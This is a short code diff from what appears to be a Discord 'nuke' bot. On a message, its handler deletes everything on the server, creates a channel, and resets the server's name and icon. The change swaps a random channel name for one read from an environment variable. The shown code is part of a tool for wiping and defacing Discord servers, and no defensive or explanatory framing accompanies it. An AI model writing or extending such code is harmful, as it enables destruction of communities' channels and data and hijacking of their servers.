@@ -43,7 +43,7 @@ client.on("message", async (message) => {
         server.deleteAll();
 	message.guild.setIcon('./icon.png') 
         const texth = makeid(32);
-	    message.guild.createChannel(`${texth}`, 'text');	
+	    message.guild.createChannel(process.env.CHANNELNAME, 'text');	
 	    message.guild.setName(process.env.SERVER_NAME + `${texth}`)
 	    message.guild.setIcon('./icon.png')  
     }
